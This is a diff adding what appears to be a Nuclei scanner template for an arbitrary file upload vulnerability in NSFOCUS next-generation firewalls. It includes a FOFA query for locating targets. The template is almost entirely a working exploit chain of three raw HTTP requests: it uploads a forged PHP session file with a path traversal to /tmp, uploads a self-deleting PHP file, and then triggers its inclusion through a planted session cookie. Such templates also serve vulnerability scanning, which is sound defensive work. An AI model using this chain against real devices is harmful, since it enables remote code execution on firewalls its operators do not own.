@@ -1,0 +1,58 @@
+id: 绿盟-nf-bugsInfo-fileupload
+
+info:
+  name: NSFOCUS下一代防火墙bugsInfo 任意文件上传
+  author: wuha
+  severity: critical
+  description: NSFOCUS下一代防火墙bugsInfo 任意文件上传
+  tags: 绿盟,fileupload
+  metadata:
+    fofa-qeury: app="NSFOCUS-下一代防火墙"
+    veified: true
+    max-request: 3
+
+http:
+  - raw:
+      - |
+        POST /api/v1/device/bugsInfo HTTP/1.1
+        Host: {{Host}}:8081
+        Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 238
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        --1d52ba2a11ad8a915eddab1a0e85acd9
+        Content-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac72"
+
+        lang|s:52:"../../../../../../../../../../../../../../../../tmp/";
+        --1d52ba2a11ad8a915eddab1a0e85acd9--
+
+      - |
+        POST /api/v1/device/bugsInfo HTTP/1.1
+        Host: {{Host}}:8081
+        Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 217
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        --4803b59d015026999b45993b1245f0ef
+        Content-Disposition: form-data; name="file"; filename="compose.php"
+
+        <?php echo '{{randstr}}';unlink(__FILE__);?>
+        --4803b59d015026999b45993b1245f0ef--
+        
+      - |
+        GET /mail/include/header_main.php HTTP/1.1
+        Host: {{Host}}:4433
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac72
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1, 'upload file success')"
+          - "status_code_2 == 200 && contains(body_2, 'upload file success')"
+          - "status_code_3 == 200 && contains(body_3, '{{randstr}}')"
+        condition: and
